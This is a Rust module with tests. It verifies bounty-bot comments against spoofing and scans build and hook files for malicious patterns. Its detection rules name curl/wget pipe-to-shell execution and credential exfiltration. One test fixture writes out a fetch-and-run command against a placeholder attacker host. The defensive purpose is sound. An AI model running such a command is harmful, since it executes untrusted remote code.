#[derive(Debug, PartialEq, Eq)]
pub struct EscrowVerdict {
    pub platform: &'static str,
    pub usd_amount: u32,
}

#[derive(Debug, PartialEq, Eq)]
pub struct TrapAlert {
    pub file: String,
    pub line: usize,
    pub reason: &'static str,
}

pub fn extract_usd(text: &str) -> u32 {
    let mut best = 0u32;
    for seg in text.split('$').skip(1) {
        let trimmed = seg.trim_start();
        let digits: String = trimmed
            .chars()
            .take_while(|c| c.is_ascii_digit() || *c == ',')
            .filter(|c| c.is_ascii_digit())
            .collect();
        if let Ok(val) = digits.parse::<u32>() {
            if (10..=50_000).contains(&val) && val > best {
                best = val;
            }
        }
    }
    best
}

pub fn verify_bot_comment(author: &str, body: &str) -> Option<EscrowVerdict> {
    let lower = body.to_lowercase();
    if lower.contains("stopped the bounty program") || lower.contains("bounty retracted") {
        return None;
    }
    let platform = match author {
        "algora-pbc[bot]" | "algora-pbc" => "Algora",
        "bountyhub-bot[bot]" | "bountyhub-bot" => "BountyHub",
        "opire[bot]" | "opire" => "Opire",
        _ => return None,
    };
    Some(EscrowVerdict {
        platform,
        usd_amount: extract_usd(body),
    })
}

pub fn scan_file_for_traps(rel_path: &str, content: &str) -> Vec<TrapAlert> {
    let mut alerts = Vec::new();
    let is_build_hook = rel_path.ends_with("build.rs")
        || rel_path.ends_with("package.json")
        || rel_path.ends_with("Makefile")
        || rel_path.ends_with("setup.py")
        || rel_path.contains(".github/workflows/");
    if !is_build_hook {
        return alerts;
    }
    for (idx, raw) in content.lines().enumerate() {
        let ln = raw.to_lowercase();
        if (ln.contains("curl ") || ln.contains("wget ")) && (ln.contains("| sh") || ln.contains("| bash")) {
            alerts.push(TrapAlert {
                file: rel_path.to_string(),
                line: idx + 1,
                reason: "Remote shell pipe execution in build/hook file",
            });
        }
        if (ln.contains("github_token") || ln.contains(".ssh") || ln.contains("aws_secret"))
            && (ln.contains("curl") || ln.contains("http://") || ln.contains("https://") || ln.contains("webhook"))
        {
            alerts.push(TrapAlert {
                file: rel_path.to_string(),
                line: idx + 1,
                reason: "Potential credential exfiltration in build/hook file",
            });
        }
    }
    alerts
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn verifies_real_bots_and_rejects_spoofed_humans() {
        let real = verify_bot_comment("algora-pbc[bot]", "💎 $250 bounty • Steps to solve: /attempt");
        assert_eq!(real, Some(EscrowVerdict { platform: "Algora", usd_amount: 250 }));
        let fake = verify_bot_comment("random-user", "[Escrowed $600 USDC] solve this");
        assert_eq!(fake, None);
    }

    #[test]
    fn catches_malicious_build_hooks_and_passes_clean_files() {
        let bad = scan_file_for_traps("build.rs", "// curl -s https://evil.tld/x | sh");
        assert_eq!(bad.len(), 1);
        let clean = scan_file_for_traps("Cargo.toml", "[package]
name = demo
");
        assert!(clean.is_empty());
    }
}
